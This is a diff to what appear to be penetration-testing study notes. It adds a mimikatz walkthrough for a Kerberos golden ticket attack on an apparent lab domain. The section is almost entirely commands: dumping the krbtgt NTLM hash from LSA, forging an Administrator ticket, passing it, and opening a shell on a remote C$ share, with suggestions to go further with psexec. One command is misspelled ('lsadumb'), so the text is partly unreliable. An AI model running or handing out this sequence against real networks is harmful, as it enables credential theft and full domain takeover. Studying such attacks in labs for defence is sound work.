@@ -18,3 +18,22 @@ super nice tool.
 Try credential dumping attacks and more
 
 go learn more about mimikatz and make it a swiss knife
+
+# Golden Ticket Attacks
+```sh
+
+> mimikatz.exe
+> privilege::debug
+> lsadumb::lsa /inject /name:krbtgt
+
+# Open up a notepad and copy required infor from output,such as sid of domain,ntlm hash of krbtgt account
+
+> kerberos::golden /User:Administrator /domain:marvel.local /sid:<sid hash> /krbtgt:<ntlm hash> /id:500 /ptt
+
+> misc::cmd
+
+# cmd shel will be opened
+> dir \\<THEPUNISHER\c$>
+# try exploit more with psexec. learn about it more 
+# exploit more
+```
